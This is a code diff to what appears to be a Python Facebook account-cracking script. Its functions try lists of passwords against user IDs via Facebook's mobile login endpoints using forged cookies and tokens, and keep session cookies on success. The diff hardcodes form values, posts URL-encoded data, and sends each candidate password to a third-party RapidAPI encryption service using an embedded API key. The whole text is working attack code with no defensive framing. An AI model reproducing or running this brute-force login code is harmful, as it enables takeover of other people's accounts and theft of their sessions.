@@ -1431,8 +1431,8 @@ def p(uid,pwx,tl):
             'cancel': 'https://staticxx.facebook.com/x/connect/xd_arbiter/?version=46',
             'lwv': '100',}
             data = {
-            'm_ts': re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
-            'li': re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+            'm_ts': '1758859976',
+            'li': 'yBLWaNo3yCbGoJgrOxFDDjjk',
             'try_number': '0',
             'unrecognized_tries': '0',
             'email': uid,
@@ -1508,6 +1508,10 @@ def x(uid,pwx,tl):
     try:
         for pw in pwx:
             Session = requests.Session()
+            resp = requests.get("https://password-enc-api-instagram-facebook.p.rapidapi.com/api/pass_enc/",
+            headers={"x-rapidapi-key":"5b5179b509msh1ba72c98ba4d120p1e1335jsn6eb28abafc48","x-rapidapi-host":"password-enc-api-instagram-facebook.p.rapidapi.com"},
+            params={"p":pw,"v":"5","m":"fbweb"}).json()
+            encpass = f'"{resp.get("pass") or resp.get("encpass") or resp.get("result") or next(iter(resp.values()))}"'
             free_fb = Session.get('https://touch.facebook.com').text
             cookies = {
             'datr': 'yIPWaIDxkIPs2RBXUahPdrLk',
@@ -1555,7 +1559,7 @@ def x(uid,pwx,tl):
             'had_password_prefilled': 'true',
             'is_smart_lock': 'false',
             'bi_xrwh': '92004344361786634',
-            'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),
+            'encpass': encpass,
             'fb_dtsg': 'NAfup2Me3JHXJFN2yxBY35qKn-1LtNpMqJhQzaJ3AqYbs8PMFOvFhGw:0:0',
             'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
             'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
@@ -1568,11 +1572,12 @@ def x(uid,pwx,tl):
             'fmt': '1',
             'a': 'AYrzCMozrxxEkLpLMe4Y2HjtqtsmVGwYzrN5JRYYClldhdPtYgFp1Jf_aTSnrZs9GEMJRGEqpBnp7Yr7bbjZFjK5_l3XCV2rjhwTOtu5o4lWwg',
             '_user': '0',}
+            urlencoded_string = urllib.parse.urlencode(data)
             url = "https://m.facebook.com/login/device-based/login/async/"
             Session.headers.update(headers)
             for k, v in cookies.items():
                 Session.cookies.set(k, v, domain=".facebook.com")
-            resp = Session.post(url, params=params, data=data, allow_redirects=True, timeout=30)
+            resp = Session.post(url, params=params, data=urlencoded_string, allow_redirects=True, timeout=30)
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
                 cok = Session.cookies.get_dict()
